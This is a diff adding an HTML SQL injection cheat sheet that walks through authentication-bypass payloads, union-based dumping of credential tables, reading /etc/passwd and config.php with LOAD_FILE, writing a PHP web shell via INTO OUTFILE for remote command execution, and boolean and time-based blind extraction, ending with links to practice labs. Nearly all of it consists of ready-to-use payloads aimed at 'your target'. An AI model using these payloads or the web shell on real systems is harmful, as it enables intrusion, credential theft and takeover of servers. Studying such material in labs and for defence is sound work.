@@ -1,0 +1,153 @@
+<h1 id="sql-injection">SQL Injection</h1>
+<p><img src="https://user-images.githubusercontent.com/79256105/172219613-c1e688dc-d2fc-4a1c-9e56-35cb868ae5f2.png" alt="sql-injection"></p>
+<h1 id="what-is-sql-injection-">What is SQL Injection?</h1>
+<p>SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.</p>
+<h1 id="types-of-sql-injection">Types of SQL Injection</h1>
+<p><img src="https://user-images.githubusercontent.com/79256105/175160165-af1189b5-f22c-41fa-8d8e-7e4e1d14da57.png" alt="sql"></p>
+<h2 id="authentication-bypass-subverting-query-logic-">Authentication Bypass(Subverting Query Logic)</h2>
+<p>Subverting Query Login used to bypass authenticatio of login page . In this technique, hacker used true statement <strong>&#39; or 1=1 / &#39; or &#39;1&#39;=&#39;1&#39;-- -</strong> to bypass application query or user credentials matching.
+Some True Statement Payload :</p>
+<pre><code>               <span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">' = '</span><span class="hljs-number">1</span>
+               <span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">' = '</span><span class="hljs-number">1</span>’
+               <span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">' = '</span><span class="hljs-number">1</span> <span class="hljs-comment">-- -</span>
+               <span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">' = '</span><span class="hljs-number">1</span> <span class="hljs-comment">#                         </span>
+</code></pre><h5 id="-for-more-payload-check-payload-all-things-github-repo-https-github-com-swisskyrepo-payloadsallthethings-tree-master-sql-20injection">👁️‍🗨️ For More Payload check payload all things github repo <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></h5>
+<h2 id="in-band-sql-injection">In-Band SQL Injection</h2>
+<p>In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as In-band SQL injection, and it has two types: <strong>Union Based and Error Based.</strong></p>
+<h5 id="error-based-">Error Based :</h5>
+<pre><code>                       Get <span class="hljs-keyword">the</span> PHP <span class="hljs-keyword">or</span> SQL errors <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> front-<span class="hljs-keyword">end</span>
+</code></pre><h5 id="union-based-">Union Based:</h5>
+<pre><code>                      Get Fixed Column <span class="hljs-built_in">number</span> <span class="hljs-keyword">and</span> Uses Union query <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> database information
+</code></pre><h2 id="how-to-indentify-error-based-sql-injection">How to Indentify Error Based SQL Injection</h2>
+<h4 id="step1-">Step1:</h4>
+<pre><code>       <span class="hljs-type">Find</span> <span class="hljs-keyword">out</span> injection parameter <span class="hljs-keyword">using</span> fuzzing tools <span class="hljs-keyword">or</span> manually
+</code></pre><h4 id="step2-">Step2:</h4>
+<pre><code>       Use Given below payoad
+
+     Payload     URL Encoded
+          '     %<span class="hljs-number">27</span>
+          <span class="hljs-string">"     %22</span>
+          <span class="hljs-meta">#     %23</span>
+          ;     %<span class="hljs-number">3</span>B
+          )     %<span class="hljs-number">29</span>
+</code></pre><p>If we get sql error , there has error based SQL injection and then, Use SQL Map for Automatic SQL Injection Pen-Testing / Manually Testing</p>
+<h5 id="-for-more-payload-check-payload-all-things-github-repo-https-github-com-swisskyrepo-payloadsallthethings-tree-master-sql-20injection">👁️‍🗨️ For More Payload check payload all things github repo <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></h5>
+<h2 id="how-to-identify-union-base-sql-injection">How to identify Union Base SQL Injection</h2>
+<h4 id="step1-">Step1:</h4>
+<pre><code>      find out actual column <span class="hljs-keyword">number</span> using <span class="hljs-keyword">order</span> <span class="hljs-title">by</span>  / <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> -- - operation
+</code></pre><h4 id="step2-">Step2:</h4>
+<pre><code>        use actual column number <span class="hljs-keyword">with</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">operation</span></span>
+        <span class="hljs-symbol">example:</span> ‘ <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,3-- - </span>
+</code></pre><h4 id="step3-">Step3:</h4>
+<pre><code>      <span class="hljs-built_in"> check </span>which column number show in your target website
+</code></pre><h4 id="step4-">Step4:</h4>
+<pre><code>       use <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">base</span> <span class="hljs-title">payload</span> <span class="hljs-title">in</span> <span class="hljs-title">perfect</span> <span class="hljs-title">column</span> <span class="hljs-title">number</span> <span class="hljs-title">to</span> <span class="hljs-title">exploit</span> <span class="hljs-title">database</span></span>
+</code></pre><h2 id="method-for-dumping-data-from-database-using-uninon-sql-injection">Method for dumping data from database using Uninon SQL Injection</h2>
+<h5 id="schema-schemata-check">Schema,Schemata check</h5>
+<pre><code>  mysql&gt; <span class="hljs-keyword">SELECT</span> SCHEMA_NAME <span class="hljs-keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA;
+</code></pre><h4 id="step-1-schema-database-check">Step 1: Schema/Database check</h4>
+<pre><code> ' UNION select <span class="hljs-number">1</span>,schema_name,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> from INFORMATION_SCHEMA.SCHEMATA-- -
+</code></pre><h4 id="step-2-tables-check">Step 2: Tables check</h4>
+<pre><code>  ' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,TABLE_NAME,TABLE_SCHEMA,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.TABLES <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'dev'</span><span class="hljs-comment">-- -</span>
+</code></pre><p>Here , dev is database name which will replace to your target database name</p>
+<h4 id="step3-columns-check">Step3: Columns check</h4>
+<pre><code>  ' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA <span class="hljs-keyword">from</span> INFORMATION_SCHEMA.COLUMNS <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'credentials'</span><span class="hljs-comment">-- -</span>
+</code></pre><p>Here , credentials is table name whick will replace to your target table name</p>
+<h4 id="step4-dum-data-from-table-">Step4: Dum Data from table:</h4>
+<pre><code>  ' UNION <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, username, <span class="hljs-keyword">password</span>, <span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dev.credentials<span class="hljs-comment">-- -</span>
+</code></pre><p>Where username and password are column name , dev is database name , credentials is table name</p>
+<h2 id="read-data-sensitive-files-using-union-sql-injection">Read Data/Sensitive files using Union SQL Injection</h2>
+<pre><code> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>()
+ <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CURRENT_USER</span>()
+ <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> mysql.user
+</code></pre><h4 id="step-1-privilege-check">Step 1:Privilege Check</h4>
+<pre><code>  <span class="hljs-keyword">SELECT</span> super_priv <span class="hljs-keyword">FROM</span> mysql.user
+  <span class="hljs-string">' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+  '</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, super_priv, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> <span class="hljs-keyword">FROM</span> mysql.user <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">"root"</span><span class="hljs-comment">-- -</span>
+  <span class="hljs-string">' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -</span>
+</code></pre><h4 id="step-2-load-file">Step 2:Load File</h4>
+<p>Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:</p>
+<pre><code>  <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">'/etc/passwd'</span>);
+
+  Example:
+  ' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">"/etc/passwd"</span>), <span class="hljs-number">3</span>, <span class="hljs-number">4</span><span class="hljs-comment">-- -</span>
+</code></pre><h4 id="another-example">Another Example</h4>
+<p>We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.</p>
+<pre><code>  ' UNION SELECT <span class="hljs-number">1</span>, LOAD_FILE(<span class="hljs-string">"/var/www/html/search.php"</span>), <span class="hljs-number">3</span>, <span class="hljs-number">4</span>-- -
+  ' UNION SELECT <span class="hljs-number">1</span>, LOAD_FILE(<span class="hljs-string">"/var/www/html/config.php"</span>), <span class="hljs-number">3</span>, <span class="hljs-number">4</span>-- -
+</code></pre><h3 id="write-files-using-union-sql-injection-or-rce-using-sql-injection">Write Files Using Union SQL Injection or RCE Using SQL Injection</h3>
+<p>Example</p>
+<pre><code>  ' union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">'file written successfully!'</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'/var/www/html/proof.txt'</span><span class="hljs-comment">-- -</span>
+</code></pre><p>Web Shell Upload:</p>
+<pre><code>  ' union <span class="hljs-keyword">select</span> <span class="hljs-string">""</span>,<span class="hljs-string">'&lt;?php system($_REQUEST[0]); ?&gt;'</span>, <span class="hljs-string">""</span>, <span class="hljs-string">""</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">'/var/www/html/shell.php'</span><span class="hljs-comment">-- -</span>
+</code></pre><p>Basic PHP Web Shell:</p>
+<pre><code>  <span class="php"><span class="hljs-meta">&lt;?php</span> system($_REQUEST[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>
+</code></pre><p>OR </p>
+<pre><code>  <span class="php"><span class="hljs-meta">&lt;?php</span> system($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span></span>
+</code></pre><h3 id="for-rce-call-uploaded-web-shell">For RCE , Call Uploaded Web shell</h3>
+<p>Example :</p>
+<pre><code>      url/upload_file.php?<span class="hljs-keyword">parameter</span>=commnad
+
+      http:<span class="hljs-comment">//cyberteach360/shell.php?cmd=id</span>
+</code></pre><h1 id="boolean-based-sql-injection">Boolean Based SQL Injection</h1>
+<p>Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can&#39;t provide much information. Still, in fact, with just these two responses, it&#39;s possible to enumerate a whole database structure and contents.</p>
+<h4 id="step-1-find-out-actual-column-number">Step 1:Find out actual column number</h4>
+<pre><code>  <span class="hljs-number">1.</span>admin123' UNION SELECT <span class="hljs-number">1</span>;-- 
+  <span class="hljs-number">2.</span>admin123' UNION SELECT <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;--
+</code></pre><p>if response is true till 1,2,3 but flase in 1,2,3,4 ,the target column <strong><em>number is 3</em></strong></p>
+<h4 id="step-2-find-out-database-name">Step 2:Find out database name</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">'some character%'</span>;<span class="hljs-comment">--</span>
+  example:
+          admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">'s%'</span>;<span class="hljs-comment">--</span>
+</code></pre><p> Sequentially change the character and check the respons is true or flase
+ suppose we got the <strong><em>database name  :sqli_three</em></strong></p>
+<h4 id="step-3-find-out-table-name">Step 3:Find out table name</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.tables <span class="hljs-keyword">WHERE</span> table_schema = <span class="hljs-string">'sqli_three'</span> <span class="hljs-keyword">and</span> table_name <span class="hljs-keyword">like</span> <span class="hljs-string">'a%'</span>;<span class="hljs-comment">--         </span>
+</code></pre><p>Sequentially change the character and check the respons is true or flase
+suppose we got the <strong><em>table name  :users</em></strong></p>
+<h4 id="step-4-find-out-column-name">Step 4:Find out Column name</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> information_schema.COLUMNS <span class="hljs-keyword">WHERE</span> TABLE_SCHEMA=<span class="hljs-string">'sqli_three'</span> <span class="hljs-keyword">and</span> TABLE_NAME=<span class="hljs-string">'users'</span> <span class="hljs-keyword">and</span> COLUMN_NAME <span class="hljs-keyword">like</span> <span class="hljs-string">'a%'</span> <span class="hljs-keyword">and</span> COLUMN_NAME !=<span class="hljs-string">'id'</span>;
+</code></pre><p>After,sequentially Repeating this process you will get column name.
+suppose, the <strong><em>column name username and another is password</em></strong></p>
+<h4 id="step-5-find-out-username-column-value">Step 5:Find out username column value</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">'a%</span>
+</code></pre><p> After,sequentially Repeating this process you will get <strong><em>column username value and this is:admin.</em></strong></p>
+<h4 id="step-6-find-out-password-column-value">Step 6:Find out password column value</h4>
+<pre><code>    admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">'admin'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">'a%</span>
+</code></pre><p>if you properly do this , you will get <strong><em>password and the credentials are username=admin ,password=3356 </em></strong></p>
+<h1 id="time-base-sql-injection">Time Base SQL Injection</h1>
+<p>A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as <strong><em>SLEEP(x)</em></strong> alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 
+So, for example, when trying to establish the number of columns in a table, you would use the following query:</p>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">--</span>
+</code></pre><h4 id="step-1-find-out-actual-column-number">Step 1:Find out actual column number</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">--</span>
+</code></pre><p>If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:</p>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>),<span class="hljs-number">2</span>;<span class="hljs-comment">--</span>
+</code></pre><p>if again no pause in the response time , increase column number like</p>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span>;<span class="hljs-comment">--</span>
+</code></pre><h3 id="step-2-find-out-dabase-name">Step 2:Find out dabase name</h3>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">'u%'</span>;<span class="hljs-comment">--</span>
+</code></pre><p>Here dabase <strong><em>name :sqli_four</em></strong>     </p>
+<h3 id="step-3-find-out-table-name">Step 3:Find out table name</h3>
+<pre><code>  admin123<span class="hljs-string">' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = '</span>sqli_fo<span class="hljs-string">ur' and table_name like '</span>a%<span class="hljs-string">';--</span>
+</code></pre><p>Here <strong><em>table name:users</em></strong></p>
+<h4 id="step4-find-out-column-name">Step4:Find out Column name</h4>
+<pre><code>  admin123<span class="hljs-string">' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='</span>sqli_fo<span class="hljs-string">ur' and TABLE_NAME='</span>users<span class="hljs-string">' and COLUMN_NAME like '</span>a%<span class="hljs-string">';</span>
+</code></pre><p>Here Column name <strong><em>username and password</em></strong></p>
+<h4 id="step5-findout-column-value">Step5:Findout Column value</h4>
+<pre><code>  admin123' UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">SLEEP</span>(<span class="hljs-number">5</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">'a%</span>
+</code></pre><p> Here <strong><em>username:admin</em></strong>
+      admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%
+ Here <strong><em>password:pass</em></strong>
+ SO the target login credentials 
+                                <strong><em>username:admin
+                                password:pass</em></strong></p>
+<h2 id="practicing-and-learning-resources-">Practicing and Learning Resources:</h2>
+<h4 id="try-hack-me-">Try Hack Me :</h4>
+<pre><code>  https:<span class="hljs-regexp">//</span>tryhackme.com<span class="hljs-regexp">/room/</span>sqlinjectionlm
+  https:<span class="hljs-regexp">//</span>tryhackme.com<span class="hljs-regexp">/room/</span>sqhell
+</code></pre><h4 id="hack-the-box-academy-">Hack The Box Academy :</h4>
+<pre><code>  https:<span class="hljs-regexp">//</span>academy.hackthebox.com<span class="hljs-regexp">/module/</span><span class="hljs-number">33</span><span class="hljs-regexp">/section/</span><span class="hljs-number">177</span>
+</code></pre><h4 id="port-swigger-">Port Swigger:</h4>
+<pre><code> https:<span class="hljs-regexp">//</span>portswigger.net<span class="hljs-regexp">/web-security/</span>sql-injection
+</code></pre>
